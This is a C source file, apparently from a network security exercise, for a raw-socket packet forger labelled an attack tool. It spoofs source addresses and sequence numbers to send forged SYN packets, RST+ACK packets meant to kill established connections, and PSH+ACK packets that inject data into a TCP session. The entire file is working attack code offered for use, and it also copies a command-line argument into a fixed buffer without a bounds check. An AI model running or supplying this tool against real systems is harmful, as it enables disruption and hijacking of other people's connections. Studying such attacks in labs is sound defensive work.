#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t protocol;
    uint16_t len;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        unsigned short odd = 0;
        *((unsigned char *)&odd) = *(unsigned char *)ptr;
        sum += odd;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if (argc < 8) {
        printf("USAGE:\n");
        printf("  SYN attack:   sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n");
        printf("  RST attack:   sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n");
        printf("  DATA attack:  sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
        return 1;
    }

    char mode = argv[1][0];
    char *src_ip = argv[2];
    int src_port = atoi(argv[3]);
    char *dst_ip = argv[4];
    int dst_port = atoi(argv[5]);
    uint32_t seq = strtoul(argv[6], NULL, 10);
    uint32_t ack = strtoul(argv[7], NULL, 10);

    char datagram[4096];
    memset(datagram, 0, sizeof(datagram));

    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    char *data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);

    int payload_len = 0;
    if (mode == 'D' && argc > 8) {
        strcpy(data, argv[8]);
        payload_len = strlen(argv[8]);
    }

    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(dst_ip);
    iph->check = csum((unsigned short *)iph, iph->ihl * 4);

    // TCP Header
    tcph->source = htons(src_port);
    tcph->dest = htons(dst_port);
    tcph->seq = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff = 5;
    tcph->window = htons(65535);

    // flags reset
    tcph->syn = 0;
    tcph->ack = 0;
    tcph->psh = 0;
    tcph->rst = 0;
    tcph->fin = 0;

    // Mode selection
    if (mode == 'S') {
        tcph->syn = 1;
    } else if (mode == 'R') {
        tcph->rst = 1;
        tcph->ack = 1;   // RST+ACK to kill established connection
    } else if (mode == 'D') {
        tcph->psh = 1;
        tcph->ack = 1;
    }

    // TCP checksum via pseudo-header
    struct pseudo_header psh;
    psh.src = iph->saddr;
    psh.dst = iph->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_TCP;
    psh.len = htons(sizeof(struct tcphdr) + payload_len);

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len;
    char *pseudogram = malloc(psize);

    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph,
           sizeof(struct tcphdr) + payload_len);

    tcph->check = csum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    // Raw socket send
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("socket");
        exit(1);
    }

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = tcph->dest;
    sin.sin_addr.s_addr = iph->daddr;

    if (sendto(s, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len,
               0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
    } else {
        printf("Packet sent: mode=%c seq=%u ack=%u\n", mode, seq, ack);
    }

    close(s);
    return 0;
}
